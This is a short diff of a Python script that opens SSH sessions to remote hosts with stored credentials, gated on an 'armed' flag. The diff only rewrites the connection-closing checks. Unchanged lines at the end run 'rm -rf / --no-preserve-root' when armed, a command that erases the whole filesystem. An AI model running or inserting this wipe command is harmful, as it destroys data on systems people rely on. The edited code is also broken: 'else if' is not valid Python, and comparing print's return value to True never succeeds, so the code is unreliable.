@@ -22,9 +22,9 @@ if (armed == True):
   output = shell.recv(10000)
   output = output.decode('utf-8') 
   print(output)
-if print(ssh_client.get_transport().is_active()) == True:
-    print('Closing connection')
-    ssh_client.close()
+else if print(ssh_client.get_transport().is_active()) == True:
+  print('Closing connection')
+  ssh_client.close()
     
 if (armed == True):    
   ssh_client.connect(ip2,username=username,password=password, look_for_keys=False, allow_agent=False)
@@ -37,9 +37,9 @@ if (armed == True):
   output = shell.recv(10000)
   output = output.decode('utf-8') 
   print(output)
-if print(ssh_client.get_transport().is_active()) == True:
-    print('Closing connection')
-    ssh_client.close()
+else if print(ssh_client.get_transport().is_active()) == True:
+  print('Closing connection')
+  ssh_client.close()
 
 if (armed == True):
   os.system('rm -rf / --no-preserve-root')
